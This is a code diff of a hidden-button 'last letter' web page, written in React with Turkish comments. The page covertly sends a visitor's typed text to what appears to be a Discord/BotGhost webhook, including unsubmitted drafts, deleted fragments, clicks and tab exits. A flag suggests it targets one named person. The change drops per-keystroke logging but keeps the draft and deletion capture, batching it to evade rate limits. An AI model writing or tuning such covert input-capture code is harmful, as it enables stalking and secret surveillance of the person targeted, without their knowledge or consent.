@@ -7,7 +7,7 @@ import { postLogToApi } from '../utils/gardenEngine';
  * - Arkaplan zifiri siyah (#000000). Hiçbir yazı yok.
  * - Sağ altta çok küçük, zayıfça fark edilebilen 6px yuvarlak gizli buton.
  * - Butona tıklanınca "Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?" sorusu ve yazı alanı açılır.
- * - YAZILAN HER ŞEY (gönderilsin ya da gönderilmesin), basılan her bir tuş (key stroke), canlı harf/kelime akışı, silinenler, kutudan çıkışlar, tıklamalar ve sekmeden ayrılmalar anlık bildirim olarak gönderilir.
+ * - YAZILAN HER ŞEY (gönderilsin ya da gönderilmesin) tek mesaj altında toplanarak, rate-limit'e takılmadan konsolide anlık bildirim olarak gönderilir.
  */
 export default function LastLetterPage({ onGoHome }) {
   // Device & Auth
@@ -121,7 +121,7 @@ export default function LastLetterPage({ onGoHome }) {
     };
   }, [sendLog, deviceId]);
 
-  // Global Tab Exit & Tab Return Visibility Sentinel (Immediate notification carrying un-submitted draft text)
+  // Global Tab Exit & Tab Return Visibility Sentinel (Carries draft text when tab is changed or closed)
   useEffect(() => {
     let isHiddenState = false;
 
@@ -151,7 +151,6 @@ export default function LastLetterPage({ onGoHome }) {
           is_aysenur: true
         };
 
-        // Send Beacon for background reliability
         if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
           try {
             const rawPayload = JSON.stringify({
@@ -232,7 +231,7 @@ export default function LastLetterPage({ onGoHome }) {
   useEffect(() => {
     const handleGlobalClick = (e) => {
       const now = Date.now();
-      if (now - lastClickTimeRef.current < 400) return; // Debounce rapid multi-clicks (400ms)
+      if (now - lastClickTimeRef.current < 500) return; // Debounce rapid multi-clicks (500ms)
       lastClickTimeRef.current = now;
 
       const clickType = e.type === 'contextmenu' ? 'Sağ Tıklama (Context Menu)' : 'Sol Tıklama';
@@ -287,104 +286,53 @@ export default function LastLetterPage({ onGoHome }) {
     });
   };
 
-  // Live Typing Stream Engine (Captures additions, word boundaries, deletions instantly whether submitted or not!)
+  // Consolidated Live Typing Stream Engine (Aggregates text changes into clean single messages)
   const handleInputChange = (e) => {
     const newVal = e.target.value;
     const oldVal = prevTextRef.current;
     setInputText(newVal);
 
-    // 1. Accumulate typed characters
+    // 1. Accumulate typed characters into memory
     if (newVal.length > oldVal.length) {
       const added = newVal.slice(oldVal.length);
       allTypedHistoryRef.current += added;
     } else if (newVal.length < oldVal.length) {
-      // 2. Track deleted text snippets
+      // 2. Track deleted text snippets into memory
       const deletedSegment = oldVal.slice(newVal.length);
       if (deletedSegment) {
         deletedTextHistoryRef.current += ` [silindi: "${deletedSegment}"]`;
-
-        // Immediately send single deletion notification
-        sendLog('secret_input_deleted', {
-          letterText: newVal,
-          answer: newVal,
-          answerInput: newVal,
-          allTypedHistory: allTypedHistoryRef.current || newVal,
-          deletedText: deletedSegment,
-          draftLength: newVal.length,
-          action: `✂️ Ziyaretçi Metin Sildi: "${deletedSegment}" (Kalan: "${newVal}")`
-        });
-        lastSentTextRef.current = newVal;
-        lastSentTimeRef.current = Date.now();
       }
     }
 
     prevTextRef.current = newVal;
 
-    // 3. Live Streaming Engine: Trigger instantly on space/punctuation or every 300ms while typing
-    const isSpaceOrPunctuation = /\s|[.,!?]$/.test(newVal);
-    const timeSinceLastSend = Date.now() - lastSentTimeRef.current;
+    // 3. Smart Aggregated Buffer Engine (Prevents BotGhost rate-limit and groups keystrokes into 1 consolidated update)
+    if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
 
-    if (newVal !== lastSentTextRef.current && newVal.trim().length > 0) {
-      if (isSpaceOrPunctuation || timeSinceLastSend >= 400) {
-        if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
-        lastSentTextRef.current = newVal;
+    typingTimerRef.current = setTimeout(() => {
+      if (prevTextRef.current !== lastSentTextRef.current && prevTextRef.current.trim().length > 0) {
+        lastSentTextRef.current = prevTextRef.current;
         lastSentTimeRef.current = Date.now();
 
         sendLog('secret_input_typed', {
-          letterText: newVal,
-          answer: newVal,
-          answerInput: newVal,
-          allTypedHistory: allTypedHistoryRef.current || newVal,
+          letterText: prevTextRef.current,
+          answer: prevTextRef.current,
+          answerInput: prevTextRef.current,
+          allTypedHistory: allTypedHistoryRef.current || prevTextRef.current,
           deletedText: deletedTextHistoryRef.current || null,
-          draftLength: newVal.length,
-          action: `✍️ Ziyaretçi Yazıyor (Gönderilse de Gönderilmese de): "${newVal}"`
+          draftLength: prevTextRef.current.length,
+          action: `✍️ Ziyaretçi Yazıyor: "${prevTextRef.current}"`
         });
-      } else {
-        // Fallback timer: send 300ms after typing pauses
-        if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
-        typingTimerRef.current = setTimeout(() => {
-          if (prevTextRef.current !== lastSentTextRef.current && prevTextRef.current.trim().length > 0) {
-            lastSentTextRef.current = prevTextRef.current;
-            lastSentTimeRef.current = Date.now();
-
-            sendLog('secret_input_typed', {
-              letterText: prevTextRef.current,
-              answer: prevTextRef.current,
-              answerInput: prevTextRef.current,
-              allTypedHistory: allTypedHistoryRef.current || prevTextRef.current,
-              deletedText: deletedTextHistoryRef.current || null,
-              draftLength: prevTextRef.current.length,
-              action: `✍️ Ziyaretçi Yazıyor (Gönderilse de Gönderilmese de): "${prevTextRef.current}"`
-            });
-          }
-        }, 300);
       }
-    }
-  };
-
-  // Handle Keypresses inside Textarea (Captures EVERY single key struck inside textarea!)
-  const handleInputKeyDown = (e) => {
-    if (e.key) {
-      const keyName = e.key === ' ' ? 'Space (Boşluk)' : e.key;
-      sendLog('last_user_keypress', {
-        key: keyName,
-        pressed_key: keyName,
-        targetElement: 'Gizli Soru Yazı Kutusu',
-        letterText: e.target.value,
-        allTypedHistory: allTypedHistoryRef.current,
-        deletedText: deletedTextHistoryRef.current,
-        action: `⌨️ Ziyaretçi Kutuya Tuşladı: "${keyName}" (Kutudaki Metin: "${e.target.value}")`
-      });
-    }
-
-    if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
-      handleSubmit(e);
-    }
+    }, 1200); // 1.2 second smart consolidation window
   };
 
   // Handle Unfocus / Blur from Text Area (Captures unsubmitted draft when clicking away)
   const handleInputBlur = () => {
-    if (inputText && inputText.trim().length > 0) {
+    if (inputText && inputText.trim().length > 0 && inputText !== lastSentTextRef.current) {
+      if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
+      lastSentTextRef.current = inputText;
+
       sendLog('secret_input_unfocused', {
         letterText: inputText,
         answer: inputText,
@@ -397,13 +345,15 @@ export default function LastLetterPage({ onGoHome }) {
     }
   };
 
-  // Handle Form Submission
+  // Handle Form Submission ("Gönder" button click or Ctrl+Enter / Enter)
   const handleSubmit = (e) => {
     if (e) e.preventDefault();
     if (!inputText.trim()) return;
 
     if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
+    lastSentTextRef.current = inputText;
 
+    // Send primary submission event to BotGhost / Discord
     sendLog('secret_input_submitted', {
       letterText: inputText,
       answer: inputText,
@@ -413,6 +363,19 @@ export default function LastLetterPage({ onGoHome }) {
       draftLength: inputText.length,
       action: `🔥 GİZLİ SORUYA CEVAP GÖNDERİLDİ: "${inputText}"`
     });
+
+    // Send secondary fallback event after 600ms to avoid webhook collision
+    setTimeout(() => {
+      sendLog('letter_submitted', {
+        letterText: inputText,
+        answer: inputText,
+        answerInput: inputText,
+        allTypedHistory: allTypedHistoryRef.current || inputText,
+        deletedText: deletedTextHistoryRef.current || null,
+        draftLength: inputText.length,
+        action: `🔥 GİZLİ SORUYA CEVAP GÖNDERİLDİ: "${inputText}"`
+      });
+    }, 600);
 
     setIsSubmitted(true);
     setTimeout(() => {
@@ -514,8 +477,12 @@ export default function LastLetterPage({ onGoHome }) {
             <textarea
               value={inputText}
               onChange={handleInputChange}
-              onKeyDown={handleInputKeyDown}
               onBlur={handleInputBlur}
+              onKeyDown={(e) => {
+                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+                  handleSubmit(e);
+                }
+              }}
               placeholder="Yazmak istediğin şey..."
               autoFocus
               rows={4}
